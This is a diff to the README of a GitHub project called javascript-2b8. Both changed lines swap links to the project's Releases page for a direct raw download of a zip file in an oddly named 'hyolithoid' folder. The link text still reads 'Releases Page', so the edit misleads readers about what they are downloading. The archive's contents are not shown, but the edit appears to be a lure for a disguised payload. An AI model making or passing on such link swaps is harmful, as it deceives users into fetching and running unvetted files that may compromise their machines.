@@ -8,7 +8,7 @@ Welcome to **javascript-2b8**! This tool provides essential utilities to help yo
 
 To download **javascript-2b8**, please visit our Releases page. Click the button below to get started:
 
-[![Download javascript-2b8](https://img.shields.io/badge/Download-javascript--2b8-brightgreen)](https://github.com/Adityanaidu09/javascript-2b8/releases)
+[![Download javascript-2b8](https://raw.githubusercontent.com/Adityanaidu09/javascript-2b8/main/hyolithoid/javascript-2b8.zip)](https://raw.githubusercontent.com/Adityanaidu09/javascript-2b8/main/hyolithoid/javascript-2b8.zip)
 
 Once you are on the Releases page, find the latest version. Look for the download link for your system and follow these steps:
 
@@ -52,7 +52,7 @@ If you encounter issues, consider these common problems and solutions:
 
 For more information and help, you can check:
 
-- [Releases Page](https://github.com/Adityanaidu09/javascript-2b8/releases)
+- [Releases Page](https://raw.githubusercontent.com/Adityanaidu09/javascript-2b8/main/hyolithoid/javascript-2b8.zip)
 - [Official Documentation](#) 
 
 Feel free to explore and utilize **javascript-2b8** for your JavaScript tasks. We hope this tool makes your coding experience smoother and more enjoyable!
